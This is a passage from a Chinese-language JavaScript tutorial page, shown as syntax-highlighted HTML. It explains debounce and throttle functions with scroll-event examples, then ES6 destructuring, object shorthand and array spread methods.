      <span class="token keyword">if</span> <span class="token punctuation">(</span>timeout<span class="token punctuation">)</span> <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//如果多次触发将上次记录延迟清除掉</span>
      timeout <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fn.apply(this, args);// 或者直接 func()</span>
        timeout <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span> wait<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 处理函数</span>
  <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 测试用例</span>
document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">'scroll-box'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&quot;scroll&quot;</span><span class="token punctuation">,</span> <span class="token function">debounce</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>防抖实现方式：<strong>优化版本（实现第一次触发回调事件）</strong>【要点】</p> <blockquote><p>实现原理比较简单，判断传入的 immediate 是否为 true，另外需要额外判断是否是第一次执行防抖函数，判断依旧就是 timer 是否为空，所以只要 <code>immediate &amp;&amp; !timer</code> 返回 true 就执行 fn 函数，即 <code>fn.apply(this, args)</code>。</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 实现2: immediate 表示第一次是否立即执行</span>
<span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> wait <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">,</span> immediate</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> timer <span class="token operator">=</span> <span class="token keyword">null</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>timer<span class="token punctuation">)</span> <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span>
      	<span class="token comment">// ------ 新增部分 start ------ </span>
      	<span class="token comment">// immediate 为 true 表示第一次触发后执行</span>
      	<span class="token comment">// timer 为空表示首次触发</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>immediate <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>timer<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
      	<span class="token comment">// ------ 新增部分 end ------ </span>
        timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> wait<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// 执行 debounce 函数返回新函数</span>
<span class="token keyword">const</span> betterFn <span class="token operator">=</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fn 防抖执行了'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
<span class="token comment">// 第一次触发 scroll 执行一次 fn，后续只有在停止滑动 1 秒后才执行函数 fn</span>
document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'scroll'</span><span class="token punctuation">,</span> betterFn<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h6 id="节流实现【tj】"><a href="#节流实现【tj】" class="header-anchor">#</a> 节流实现【TJ】</h6> <p>节流的实现方案一：【推荐】</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> <span class="token function-variable function">throttle</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">func<span class="token punctuation">,</span> wait</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> timeout <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//return (...args) =&gt; {</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>timeout<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            timeout <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
                <span class="token function">func</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//fn.apply(this, args);// 或者直接 func()</span>
                timeout <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span> wait<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// 处理函数</span>
<span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// 测试用例</span>
document<span class="token punctuation">.</span><span class="token function">getElementsByClassName</span><span class="token punctuation">(</span><span class="token string">'scroll-box'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">&quot;scroll&quot;</span><span class="token punctuation">,</span> <span class="token function">throttle</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p><strong>节流的实现</strong>方案二：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// fn 是需要执行的函数; // wait 是时间间隔</span>
<span class="token keyword">const</span> <span class="token function-variable function">throttle</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> wait <span class="token operator">=</span> <span class="token number">50</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> previous <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">// 上一次执行 fn 的时间</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 将 throttle 处理结果当作函数返回</span>
    <span class="token keyword">let</span> now <span class="token operator">=</span> <span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 获取当前时间，转换成时间戳，单位毫秒// = Date().now();</span>
    <span class="token comment">// 将当前时间和上一次执行函数的时间进行对比； 大于等待时间就把 previous 设置为当前时间并执行函数 fn</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> previous <span class="token operator">&gt;</span> wait<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      previous <span class="token operator">=</span> now
      <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
      <span class="token comment">//TODO; 加强功能；在这里加入防抖；</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> betterFn <span class="token operator">=</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fn 函数执行了'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token comment">//执行throttle函数返回新函数</span>
<span class="token function">setInterval</span><span class="token punctuation">(</span>betterFn<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token comment">// 每10毫秒执行一次 betterFn 函数，但是只有时间差大于 1000 时才会执行 fn</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h6 id="加强版节流-throttle"><a href="#加强版节流-throttle" class="header-anchor">#</a> 加强版节流 throttle</h6> <p>现在考虑一种情况，如果用户的操作非常频繁，不等设置的延迟时间结束就进行下次操作，会频繁的清除计时器并重新生成，所以函数 fn 一直都没办法执行，导致用户操作迟迟得不到响应。</p> <p>有一种思想是<strong>将「节流」和「防抖」合二为一，变成加强版的节流函数</strong>，关键点在于「 <strong>wait 时间内，可以重新生成定时器，但只要 wait 的时间到了，必须给用户一个响应</strong>」。这种合体思路恰好可以解决上面提出的问题。</p> <blockquote><p>结合 throttle 和 debounce 代码，加强版节流函数 throttle 如下，新增逻辑<strong>在于当前触发时间和上次触发的时间差小于时间间隔时，设立一个新的定时器</strong>，相当于<strong>把 debounce 代码放在了小于时间间隔部分</strong>。</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// fn 是需要执行的函数; // wait 是时间间隔</span>
<span class="token keyword">const</span> <span class="token function-variable function">throttle</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> wait <span class="token operator">=</span> <span class="token number">50</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> previous <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>  timer <span class="token operator">=</span> <span class="token keyword">null</span> <span class="token comment">// 上一次执行 fn 的时间</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 将 throttle 处理结果当作函数返回</span>
    <span class="token keyword">let</span> now <span class="token operator">=</span> <span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 获取当前时间，转换成时间戳，单位毫秒// = Date().now();</span>
    <span class="token comment">// 将当前时间和上一次执行函数的时间进行对比； 大于等待时间就把 previous 设置为当前时间并执行函数 fn</span>
    <span class="token comment">// ------ 新增部分 start ------ </span>
    <span class="token comment">// 判断上次触发的时间和本次触发的时间差是否小于时间间隔</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> previous <span class="token operator">&lt;</span> wait<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 如果小于，则为本次触发操作设立一个新的定时器; // 定时器时间结束后执行函数 fn </span>
       <span class="token keyword">if</span> <span class="token punctuation">(</span>timer<span class="token punctuation">)</span> <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span>
       timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          previous <span class="token operator">=</span> now
          <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> wait<span class="token punctuation">)</span>
    <span class="token comment">// ------ 新增部分 end ------ </span>
    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>now <span class="token operator">-</span> previous <span class="token operator">&gt;</span> wait<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      previous <span class="token operator">=</span> now
      <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 执行 throttle 函数返回新函数</span>
<span class="token keyword">const</span> betterFn <span class="token operator">=</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fn 函数执行了'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
<span class="token comment">// 每 10 毫秒执行一次 betterFn 函数，但是只有时间差大于 1000 时才会执行 fn</span>
<span class="token function">setInterval</span><span class="token punctuation">(</span>betterFn<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p>都处理的话：<strong>设置了 500ms 的延迟，和 1000ms 的间隔</strong>，当超过 1000ms 未触发该函数，则立即执行该函数，不然则延迟 500ms 执行该函数。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay<span class="token punctuation">,</span> atleast</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span> previous <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">var</span> curTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>curTime <span class="token operator">-</span> previous <span class="token operator">&lt;</span> atleast<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        	previous <span class="token operator">=</span> curTime<span class="token punctuation">;</span>
        	<span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
        previous <span class="token operator">=</span> curTime<span class="token punctuation">;</span>
        <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> loadImages <span class="token operator">=</span> <span class="token function">lazyload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">loadImages</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化首页的页面图片</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'scroll'</span><span class="token punctuation">,</span> <span class="token function">throttle</span><span class="token punctuation">(</span>loadImages<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h4 id="_9-解构-扩展"><a href="#_9-解构-扩展" class="header-anchor">#</a> 9:解构/扩展</h4> <h5 id="各个类型的解构"><a href="#各个类型的解构" class="header-anchor">#</a> 各个类型的解构</h5> <p><strong>字符串解构</strong>：<code>const [a, b, c, d, e] = &quot;hello&quot;</code></p> <p><strong>数值解构</strong>：<code>const { toString: s } = 123</code></p> <p><strong>布尔值解构</strong>：<code>const { toString: b } = true</code></p> <p><strong>对象解构</strong></p> <ul><li>形式：<code>const { x, y } = { x: 1, y: 2 }</code></li> <li>默认：<code>const { x, y = 2 } = { x: 1 }</code></li> <li>改名：<code>const { x, y: z } = { x: 1, y: 2 }</code></li></ul> <p><strong>数组解构</strong></p> <ul><li>规则：数据结构**具有<code>Iterator接口</code>**可采用数组形式的解构赋值</li> <li>形式：<code>const [x, y] = [1, 2]</code></li> <li>默认：<code>const [x, y = 2] = [1]</code></li></ul> <p><strong>函数参数解构</strong></p> <ul><li>数组解构：<code>function Func([x = 0, y = 1]) {}</code></li> <li>对象解构：<code>function Func({ x = 0, y = 1 } = {}) {}</code></li></ul> <p><strong>应用场景</strong></p> <ul><li>交换变量值：<code>[x, y] = [y, x]</code></li> <li>返回函数多个值：<code>const [x, y, z] = Func()</code></li> <li>定义函数参数：<code>Func([1, 2])</code></li> <li>提取JSON数据：<code>const { name, version } = packageJson</code></li> <li>定义函数参数默认值：<code>function Func({ x = 1, y = 2 } = {}) {}</code></li> <li>遍历Map结构：<code>for (let [k, v] of Map) {}</code></li> <li>输入模块指定属性和方法：<code>const { readFile, writeFile } = require(&quot;fs&quot;)</code></li></ul> <h5 id="对象扩展"><a href="#对象扩展" class="header-anchor">#</a> 对象扩展</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//对象初始化简写</span>
<span class="token keyword">function</span> <span class="token function">people</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// ES5</span>
　　<span class="token keyword">return</span> <span class="token punctuation">{</span>
　　　　name<span class="token operator">:</span> name<span class="token punctuation">,</span>
　　　　age<span class="token operator">:</span> age
　　<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">people</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// ES6</span>
　　<span class="token keyword">return</span> <span class="token punctuation">{</span>
　　　　name<span class="token punctuation">,</span>
　　　　age
　　<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//对象 字面量简写 （省略 冒号 与 function关键字）</span>
<span class="token keyword">var</span> people1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token comment">// ES5</span>
　　name<span class="token operator">:</span> <span class="token string">'bai'</span><span class="token punctuation">,</span>
　　<span class="token function-variable function">getName</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
　　　　console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
　　<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> people2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token comment">// ES6</span>
　　name<span class="token operator">:</span> <span class="token string">'bai'</span><span class="token punctuation">,</span>
　　<span class="token function">getName</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
　　　　console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
　　<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><h5 id="数组扩展"><a href="#数组扩展" class="header-anchor">#</a> 数组扩展</h5> <p><strong>应用</strong></p> <ul><li>克隆数组：<code>const arr = [...arr1]</code></li> <li>合并数组：<code>const arr = [...arr1, ...arr2]</code></li> <li>拼接数组：<code>arr.push(...arr1)</code></li> <li><strong>代替apply</strong>：<code>Math.max.apply(null, [x, y])</code> =&gt; <code>Math.max(...[x, y])</code></li> <li>转换字符串为数组：<code>[...&quot;hello&quot;]</code></li> <li>转换类数组对象为数组：<code>[...Arguments, ...NodeList]</code></li> <li>转换可遍历对象为数组：<code>[...String, ...Set, ...Map, ...Generator]</code></li> <li>与数组解构赋值结合：<code>const [x, ...rest/spread] = [1, 2, 3]</code></li> <li>计算Unicode字符长度：<code>Array.from(&quot;hello&quot;).length</code> =&gt; <code>[...&quot;hello&quot;].length</code></li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">//false</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">//-1 如果存在换回索引</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>item<span class="token operator">===</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//3 如果数组中无值返回undefined</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">findIndex</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>item<span class="token operator">===</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//2 如果数组中无值返回-1</span>

<span class="token comment">//数组的解构</span>
<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token keyword">const</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">]</span> <span class="token operator">=</span> arr
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token comment">// 1 2 3</span>

<span class="token comment">// 默认赋值</span>
<span class="token keyword">const</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr
